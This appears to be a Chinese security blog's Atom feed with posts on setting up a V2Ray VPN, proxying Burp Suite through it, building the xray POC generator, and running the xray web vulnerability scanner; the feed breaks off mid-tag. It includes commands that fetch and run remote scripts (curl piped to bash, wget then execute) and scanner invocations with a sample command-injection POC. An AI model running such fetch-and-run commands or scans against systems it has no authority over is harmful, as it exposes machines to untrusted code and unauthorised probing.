<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>madcoding’s blog</title>
  
  <subtitle>学习，沉淀，分享，交流</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.mad-coding.cn/"/>
  <updated>2019-09-20T09:09:42.326Z</updated>
  <id>https://www.mad-coding.cn/</id>
  
  <author>
    <name>madcoding</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>9元钱搭建一个自己的VPN</title>
    <link href="https://www.mad-coding.cn/2019/09/20/9%E5%85%83%E9%92%B1%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84VPN/"/>
    <id>https://www.mad-coding.cn/2019/09/20/9元钱搭建一个自己的VPN/</id>
    <published>2019-09-20T08:42:59.000Z</published>
    <updated>2019-09-20T09:09:42.326Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>科学上网。。。。此处省略一万字</p><a id="more"></a><h1 id="0x01-需求分析"><a href="#0x01-需求分析" class="headerlink" title="0x01 需求分析"></a>0x01 需求分析</h1><blockquote><p>1.一个Linux系统的vps</p><p>2.v2ray脚本</p><p>3.v2ray客户端</p></blockquote><h1 id="0x02-购买VPS"><a href="#0x02-购买VPS" class="headerlink" title="0x02 购买VPS"></a>0x02 购买VPS</h1><p>购买地址：<a href="https://virmach.com/" target="_blank" rel="noopener">传送门</a>,选择第四项，经济实惠的<code>Linux</code></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165438.png" class="lozad"></p><p>然后拉到最底下，选择<code>KVM VPS</code>，注意，这里不要选<code>open VZ</code>的<code>VPS</code>，因为这个虚拟主机不能进行<code>bbr plus</code>加速，笔者在这里踩了一个大坑，找了好久资料，没有解决，最后在团队群里的一个小伙伴告诉我了。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165452.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165505.png" class="lozad"></p><p>选择vps的配置</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165517.png" class="lozad"></p><p>位置就选默认的，速度杠杠的，然后添加到购物车</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165529.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165536.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165542.png" class="lozad"></p><p>完成订单后会跳到支付宝付款的界面，扫码付钱就行了。</p><p>之所以选择Ubuntu16位的系统是因为笔者试过了debian，centos的系统，发现都不行，真是所有坑都被我踩了。</p><h1 id="0x03-安装-V2Ray"><a href="#0x03-安装-V2Ray" class="headerlink" title="0x03 安装 V2Ray"></a>0x03 安装 V2Ray</h1><p>输入下面命令回车，你可以复制过去，然后在 Xshell 界面按 Shift + Insert 即可粘贴，不能按 Ctrl + V 的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash &lt;(curl -s -L https://git.io/v2ray.sh)</span><br></pre></td></tr></table></figure><p>如果提示 curl: command not found ，那是因为你的 VPS 没装 Curl</p><p>ubuntu/debian 系统安装 Curl 方法:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update -y &amp;&amp; apt-get install curl -y</span><br></pre></td></tr></table></figure><p>centos 系统安装 Curl 方法: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum update -y &amp;&amp; yum install curl -y</span><br></pre></td></tr></table></figure><p>安装好 curl 之后就能安装脚本了</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165722.png" class="lozad"></p><p>输入1，回车，开始安装</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165730.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165738.png" class="lozad"></p><p>选择协议，默认TCP，回车即可</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165815.png" class="lozad"></p><p>选择端口，回车</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165828.png" class="lozad"></p><p>广告拦截，回车自动选择N</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165843.png" class="lozad"></p><p>配置Shadowsocks，有需要的可以配置，也可以先不配置，等配置好v2ray以后在配置也可以</p><p>最后按enter键，等待一会，会有v2ray的配置信息出现，说明配置好了</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165900.png" class="lozad"></p><p>下载v2ray的客户端，然后导入刚刚复制的复制的配置信息</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165911.png" class="lozad"></p><p>选择从剪切板导入，导入成功后会出现下图</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165920.png" class="lozad"></p><p>有点右下角的v2ray客户端小图标，点击启用http代理</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920165935.png" class="lozad"></p><p>模式选择，有<strong>全局模式</strong>和PAC模式，</p><p><strong>全局模式</strong>状态下，你访问的所有流量都会先经过vps服务器，相当于vps是一个中间者，</p><p><strong>PAC模式</strong>状态下，你访问的流量会自动分流，国内的网站不会经过vps，只有国外的网站才会经过vps</p><p>OK,现在就可以访问Google试试了，</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920170005.png" class="lozad"></p><p>访问YouTube</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920170028.png" class="lozad"></p><p>到这里，FQ已经是成功了，但是，有个问题就是访问的网速却很慢，so，需要进行加速操作。</p><h1 id="0x04-BBR-plus内核加速"><a href="#0x04-BBR-plus内核加速" class="headerlink" title="0x04 BBR plus内核加速"></a>0x04 BBR plus内核加速</h1><h2 id="4-1-安装证书"><a href="#4-1-安装证书" class="headerlink" title="4.1 安装证书"></a>4.1 安装证书</h2><p>命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get -y install ca-certificates</span><br><span class="line">或</span><br><span class="line">yum -y install ca-certificates</span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920170235.png" class="lozad"></p><h2 id="4-2-安装加速脚本"><a href="#4-2-安装加速脚本" class="headerlink" title="4.2 安装加速脚本"></a>4.2 安装加速脚本</h2><p>命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget &quot;https://github.com/chiakge/Linux-NetSpeed/raw/master/tcp.sh&quot; &amp;&amp; chmod +x tcp.sh &amp;&amp; ./tcp.sh</span><br></pre></td></tr></table></figure><p>先在[1– 3]切换内核（第一次显示为bbr内核也要切换一遍），重启</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920170336.png" class="lozad"></p><p>安装完成，重启vps</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920170350.png" class="lozad"></p><h2 id="4-2-运行"><a href="#4-2-运行" class="headerlink" title="4.2 运行"></a>4.2 运行</h2><p>重启后不用再下载脚本，直接<code>./tcp.sh</code> ，在[4 – 8]中选你要开的加速</p><blockquote><p>“1. 安装 BBR/BBR魔改版内核” 对应4,5,6（原版，魔改，暴力魔改）</p><p>“2. 安装 BBRplus版内核 ” 对应7（plus）</p><p>“3. 安装 Lotserver(锐速)内核” 对应8（锐速）</p></blockquote><p>开启后再 ./tcp.sh ， 显示开启成功则启动成功，你也可以自己手动确认</p><p>现在你可以自由的切换你想要的加速，直到你不想折腾为止~</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920170540.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920170600.png" class="lozad"></p><p>然后在访问YouTube，测试速度，发现速度飕飕的。1080p点到哪里看哪里。</p><h1 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h1><ol><li><a href="https://github.com/233boy/v2ray/wiki/V2Ray搭建详细图文教程" target="_blank" rel="noopener">https://github.com/233boy/v2ray/wiki/V2Ray%E6%90%AD%E5%BB%BA%E8%AF%A6%E7%BB%86%E5%9B%BE%E6%96%87%E6%95%99%E7%A8%8B</a></li><li><a href="https://zhujiwiki.com/8563/" target="_blank" rel="noopener">https://zhujiwiki.com/8563/</a></li></ol><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;科学上网。。。。此处省略一万字&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>使用burpsuite抓取Google的数据包</title>
    <link href="https://www.mad-coding.cn/2019/09/20/%E4%BD%BF%E7%94%A8burpsuite%E6%8A%93%E5%8F%96Google%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85/"/>
    <id>https://www.mad-coding.cn/2019/09/20/使用burpsuite抓取Google的数据包/</id>
    <published>2019-09-20T08:36:18.000Z</published>
    <updated>2019-09-20T08:41:35.118Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>我们在测试的过程中，可能会碰到必须需要挂VPN代理才能访问的网站，但是挂了VPN以后，就不能继续设置代理抓包了，最近有一个朋友帮助我解决了这一问题。下面来给大家讲讲其中的原理和操作方法。</p><h1 id="0x01-需要的环境"><a href="#0x01-需要的环境" class="headerlink" title="0x01 需要的环境"></a>0x01 需要的环境</h1><blockquote><p>本机：Windows10 X64</p><p>需要的软件：V2ray客户端</p><p>​    burpsuite</p><p>VPS:安装了v2ray</p></blockquote><h1 id="0x02-原理解析"><a href="#0x02-原理解析" class="headerlink" title="0x02 原理解析"></a>0x02 原理解析</h1><p>原理及时本地浏览器开启本地的8080端口的代理，然后在burp中设置一个1080的本地端口代理。然后通过V2ray客户端将本地的1080端口和vps的43085端口映射上。这样就大ton过本地浏览器-&gt;burpsuite-&gt;vps-&gt;目标网站的通路，当然抓包也就不成问题了，下图是我按照自己的理解画的一个数据流向图，帮助大家理解一下其中的原理，如果理解错误的地方，欢迎大家指出。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920163850.png" class="lozad"></p><h1 id="0x03-操作流程"><a href="#0x03-操作流程" class="headerlink" title="0x03 操作流程"></a>0x03 操作流程</h1><p>1.浏览器开启代理</p><p>这里我使用了代理工具了，也可以直接在设置里面去设置。这个不会的请出门右转百度。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920163916.png" class="lozad"></p><p>2.burp中的设置</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920163926.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920163940.png" class="lozad"></p><p>3.v2ray客户端的配置</p><p>需要开启全局代理模式。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920164003.png" class="lozad"></p><p>4.访问测试</p><p>burp下不拦截数据包，随便访问一个网站，看看能否正常访问，可以正常访问说明数据是通的，配置没有问题。</p><p>可以正常访问hao123.</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920164022.png" class="lozad"></p><p>访问谷歌也是正常</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920164038.png" class="lozad"></p><p>看看<code>burpsuite</code>的历史记录中，已经有了谷歌和<code>hao123</code>的数据包记录。 数据的流向正的没有问题。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920164049.png" class="lozad"></p><p>抓一个youtube的包试试，成功抓到了YouTube的请求包</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920164106.png" class="lozad"></p><p>YouTube的返回包</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920164119.png" class="lozad"></p><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>前人栽树后人乘凉，本着分享的精神和大家分享一下，大家共同进步，觉得文章不错的点个赞就好，觉得很烂的，留下你的足迹就好。</p><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;我们在测试的过程中，可能会碰到必须需要挂VPN代理才能访问的网站，但是挂了VPN以后，就不能继续设置
      
    
    </summary>
    
      <category term="安全工具" scheme="https://www.mad-coding.cn/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="burpsuite" scheme="https://www.mad-coding.cn/tags/burpsuite/"/>
    
  </entry>
  
  <entry>
    <title>本地搭建一个poc生成器</title>
    <link href="https://www.mad-coding.cn/2019/09/17/%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AApoc%E7%94%9F%E6%88%90%E5%99%A8/"/>
    <id>https://www.mad-coding.cn/2019/09/17/本地搭建一个poc生成器/</id>
    <published>2019-09-17T09:59:08.000Z</published>
    <updated>2019-09-17T10:11:23.623Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>今天在网上意外看到一个在线的<code>poc</code>生成工具，<a href="https://phith0n.github.io/xray-poc-generation/" target="_blank" rel="noopener">传送门</a>,界面如下</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190917180032.png" class="lozad"></p><p>看到网址应该使用<code>GitHub page</code>来生成的，于是条件反射的觉得这个工具应该是开源的，so，复制<a href="https://phith0n.github.io/xray-poc-generation/" target="_blank" rel="noopener">xray-poc-generation</a>到<code>GitHub</code>上搜一下看看，果然，和我猜测的一样，这个工具是开源的。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190917180131.png" class="lozad"></p><p><code>GitHub</code>截图</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190917180144.png" class="lozad"></p><h1 id="0x01-编译项目"><a href="#0x01-编译项目" class="headerlink" title="0x01 编译项目"></a>0x01 编译项目</h1><blockquote><p>环境需求：</p><p>Git  <a href="https://www.git-scm.com/download/" target="_blank" rel="noopener">传送门</a></p><p>Node.js <a href="http://nodejs.cn/download/" target="_blank" rel="noopener">传送门</a></p><p>Yarn</p></blockquote><p>安装好<code>Git</code>后，使用<code>git</code>将项目克隆到本地</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/phith0n/xray-poc-generation</span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190917180528.png" class="lozad"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd xray-poc-generation</span><br><span class="line"></span><br><span class="line">yarn</span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190917180549.png" class="lozad"></p><p>原因：没有安装<code>yarn</code></p><p>使用<code>nmp install -g yarn</code>一键安装</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190917180601.png" class="lozad"></p><p>然后在使用<code>yarn</code>命令</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190917180614.png" class="lozad"></p><p>yarn build</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190917180627.png" class="lozad">    <img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190917180640.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190917180655.png" class="lozad"></p><h1 id="0x02-本地搭建"><a href="#0x02-本地搭建" class="headerlink" title="0x02 本地搭建"></a>0x02 本地搭建</h1><blockquote><p>环境需求：</p><p>Windows server 2003</p><p>PHPstudy</p></blockquote><p>将编译好的<code>build</code>文件夹中的内容直接复制到<code>www</code>根目录</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190917180722.png" class="lozad"></p><p>使用<code>ipconfig</code>命令查看<code>Windows server 2003 ip</code>地址</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190917180752.png" class="lozad"></p><p>然后使用 <code>http://ip地址</code> 直接访问</p><blockquote><p>注：如果直接将build文件夹复制到www目录下，需要修改index.html的文件，将相对路径改成含build的目录。</p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190917180846.png" class="lozad"></p><h1 id="0x03-测试"><a href="#0x03-测试" class="headerlink" title="0x03 测试"></a>0x03 测试</h1><p>【测试数据】</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">poc-yaml-test</span><br><span class="line"></span><br><span class="line">post</span><br><span class="line"></span><br><span class="line">/poc?name=1</span><br><span class="line"></span><br><span class="line">command=&apos;id&apos;</span><br><span class="line"></span><br><span class="line">status == 200 &amp;&amp; body.bcontains(b&apos;test output&apos;)</span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190917180916.png" class="lozad"></p><h1 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h1><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;今天在网上意外看到一个在线的&lt;code&gt;poc&lt;/code&gt;生成工具，&lt;a href=&quot;https:
      
    
    </summary>
    
      <category term="安全工具" scheme="https://www.mad-coding.cn/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="POC" scheme="https://www.mad-coding.cn/tags/POC/"/>
    
  </entry>
  
  <entry>
    <title>XRay-一款好用的漏洞挖掘工具</title>
    <link href="https://www.mad-coding.cn/2019/09/17/XRay-%E4%B8%80%E6%AC%BE%E5%A5%BD%E7%94%A8%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%B7%A5%E5%85%B7/"/>
    <id>https://www.mad-coding.cn/2019/09/17/XRay-一款好用的漏洞挖掘工具/</id>
    <published>2019-09-17T07:36:03.000Z</published>
    <updated>2019-09-20T07:34:58.165Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在漏洞挖掘中除了手动挖掘，一般都是用一些扫描器开辅助我们去进行测试，比如AWVS,APPSCAN，netsparker等等。今天给大家介绍一款被动扫描的扫描漏洞的神器——Xray，这款工具我自己用过了，的确挺好用，还能让burpsuite作为下游代理，不耽误测试。</p><p><img alt="img" data-src="https://i03piccdn.sogoucdn.com/c2c21aac4effe107" class="lozad"></p><h1 id="0x01-xray简介"><a href="#0x01-xray简介" class="headerlink" title="0x01 xray简介"></a>0x01 xray简介</h1><p>xray是从长亭洞鉴核心引擎中提取出的社区版漏洞扫描神器，支持主动、被动多种扫描方式，自备盲打平台、可以灵活定义 POC，功能丰富，调用简单，支持Windows /macOS / Linux 多种操作系统，可以满足广大安全从业者的自动化 Web 漏洞探测需求。</p><p>下载地址：<a href="https://github.com/chaitin/xray" target="_blank" rel="noopener">传送门</a></p><p>官网地址：<a href="https://chaitin.github.io/xray/#/" target="_blank" rel="noopener">传送门</a></p><p>github地址：<a href="https://github.com/chaitin/xray" target="_blank" rel="noopener">传送门</a></p><blockquote><p>可检测漏洞模块</p><ul><li><p>XSS漏洞检测 (key: xss)</p><p>利用语义分析的方式检测XSS漏洞</p></li><li><p>SQL 注入检测 (key: sqldet)</p><p>支持报错注入、布尔注入和时间盲注等</p></li><li><p>命令/代码注入检测 (key: cmd_injection)</p><p>支持 shell 命令注入、PHP 代码执行、模板注入等</p></li><li><p>目录枚举 (key: dirscan)</p><p>检测备份文件、临时文件、debug 页面、配置文件等10余类敏感路径和文件</p></li><li><p>路径穿越检测 (key: path_traversal)</p><p>支持常见平台和编码</p></li><li><p>XML 实体注入检测 (key: xxe)</p><p>支持有回显和反连平台检测</p></li><li><p>poc 管理 (key: phantasm)</p><p>默认内置部分常用的 poc，用户可以根据需要自行构建 poc 并运行。文档：<a href="https://chaitin.github.io/xray/#/guide/poc" target="_blank" rel="noopener">https://chaitin.github.io/xray/#/guide/poc</a></p></li><li><p>文件上传检测 (key: upload)</p><p>支持常见的后端语言</p></li><li><p>弱口令检测 (key: brute_force)</p><p>社区版支持检测 HTTP 基础认证和简易表单弱口令，内置常见用户名和密码字典</p></li><li><p>jsonp 检测 (key: jsonp)</p><p>检测包含敏感信息可以被跨域读取的 jsonp 接口</p></li><li><p>ssrf 检测 (key: ssrf)</p><p>ssrf 检测模块，支持常见的绕过技术和反连平台检测</p></li><li><p>基线检查 (key: baseline)</p><p>检测低 SSL 版本、缺失的或错误添加的 http 头等</p></li><li><p>任意跳转检测 (key: redirect)</p><p>支持 HTML meta 跳转、30x 跳转等</p></li><li><p>CRLF 注入 (key: crlf_injection)</p><p>检测 HTTP 头注入，支持 query、body 等位置的参数</p></li><li><p>..</p></li></ul></blockquote><h1 id="0x02-快速使用"><a href="#0x02-快速使用" class="headerlink" title="0x02 快速使用"></a>0x02 快速使用</h1><p>官网演示：</p><p><img alt="img" data-src="https://camo.githubusercontent.com/8b552644c67728075ef96a2cc56bf15730f21d28/68747470733a2f2f6368616974696e2e6769746875622e696f2f787261792f6173736574732f7465726d2e737667" class="lozad"></p><ol><li><p>使用基础爬虫爬取并对爬虫爬取的链接进行漏洞扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray webscan --basic-crawler http://example.com --html-output vuln.html</span><br></pre></td></tr></table></figure><p>不指定输出时，默认输出到控制台的标准输出中,不同参数对应不同的输出方式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#无参数：输出到控制台的标准输出</span></span><br><span class="line">--`text-output`：输出到文本文件中</span><br><span class="line">--`json-output`：输出到 JSON 文件中</span><br><span class="line">--`html-output`：输出到 HTML 文件中</span><br></pre></td></tr></table></figure><p>使用HTTP代理进行被动扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray webscan --listen 127.0.0.1:7777 --html-output proxy.html</span><br></pre></td></tr></table></figure><p>设置浏览器http代理为<code>http://127.0.0.1:7777</code>，就可以自动分析代理流量并扫描。</p><blockquote><p>如需扫描https流量，请阅读下方文档<code>抓取 https 流量</code>部分</p></blockquote></li><li><p>只扫描单个url，不使用爬虫</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray webscan --url http://example.com/ ？a = b --html-output single-url.html</span><br></pre></td></tr></table></figure></li><li><p>手动指定本次运行的插件</p><p>默认情况下，将会启用所有内置插件，可以使用下列命令指定本次扫描启用的插件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xray webscan --plugins cmd_injection，sqldet --url http://example.com</span><br><span class="line">xray webscan --plugins cmd_injection，sqldet --listen 127.0.0.1:7777</span><br></pre></td></tr></table></figure></li><li><p>指定插件输出</p><p>可以指定将本次扫描的漏洞信息输出到某个文件中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xray webscan --url http://example.com/ ？a = b</span><br><span class="line">--text-output result.txt --json-output result.json --html-output report.html</span><br></pre></td></tr></table></figure><p><a href="https://chaitin.github.io/xray/assets/report_example.html" target="_blank" rel="noopener">报告样例</a></p></li><li><p>运行只单个<strong>内置</strong> POC</p><p>在xray中，所有的pocdency属于插件<code>phantasm</code>，所以使用poc时需要开启<code>phantasm</code>插件才可生效。<code>--poc</code>参数指定本次运行的poc，如不指定，将运行所有的内置poc。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray webscan --plugins phantasm --poc poc-yaml-thinkphp5-controller-rce --url http://example.com/</span><br></pre></td></tr></table></figure></li><li><p>运行用户自定义POC</p><p>用户可以按需书写自己的YAML格式的POC，并通过指定<code>--poc</code>参数运行，比如运行在<code>/home/test/1.yaml</code>处的POC。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray webscan --plugins phantasm --poc /home/test/1.yaml --url http://example.com/</span><br></pre></td></tr></table></figure><p><code>--poc</code> 参数非常灵活，支持Glob匹配，支持从目录加载，可以从以下几个例子理解用法：</p><p>加载<code>/home/test/pocs/</code>所有的POC：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray webscan --plugins phantasm --poc “ / home / test / pocs / * ”</span><br></pre></td></tr></table></figure><p>加载<code>/home/test/pocs/</code>下包含thinkphp的POC</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray webscan --plugins phantasm --poc “ / home / test / pocs / * thinkphp * ”</span><br></pre></td></tr></table></figure><p>自定义POC请查看文档。</p></li><li><p>转发漏洞信息到数据库，邮件，IM通知等</p><p>用户可以使用<code>--webhook-output</code>将漏洞信息进行转发，后端需要返回状态200才认为发送成功，否则将打印错误日志。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray webscan --url http://example.com/ --webhook-output http：// host：port / path</span><br></pre></td></tr></table></figure></li></ol><blockquote><p>ps:如何是Windows的，需要使用xray***.exe文件</p></blockquote><h1 id="0x03-抓取https流量"><a href="#0x03-抓取https流量" class="headerlink" title="0x03  抓取https流量"></a>0x03  抓取https流量</h1><h2 id="3-1-生成证书"><a href="#3-1-生成证书" class="headerlink" title="3.1 生成证书"></a>3.1 生成证书</h2><p>和burp类似，抓取https流量需要信任一个根证书，这个根证书可以自行生成，也可用下列自带的命令生成：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xray genca  <span class="comment">## Linux</span></span><br><span class="line"></span><br><span class="line">xray_windows_amd64.exe genca <span class="comment">##Windows</span></span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920142437.png" class="lozad"></p><p>然后xray文件夹下会产生ca证书和ca.key两个文件</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920142543.png" class="lozad"></p><blockquote><p>Firefox浏览器没有使用系统的根证书管理器，意味着使用Firefox时需要单独在该浏览内导入证书才可生效。对于移动端等，可以在挂代理之后访问<code>http://xray/</code>然后下载根证书。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920143319.png" class="lozad"></p></blockquote><p>未安装证书前，提示证书风险，访问https的网站会提示证书风险</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920112843.png" class="lozad"></p><h2 id="3-2-安装证书"><a href="#3-2-安装证书" class="headerlink" title="3.2 安装证书"></a>3.2 安装证书</h2><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920143343.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920143434.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920143442.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920143458.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920143509.png" 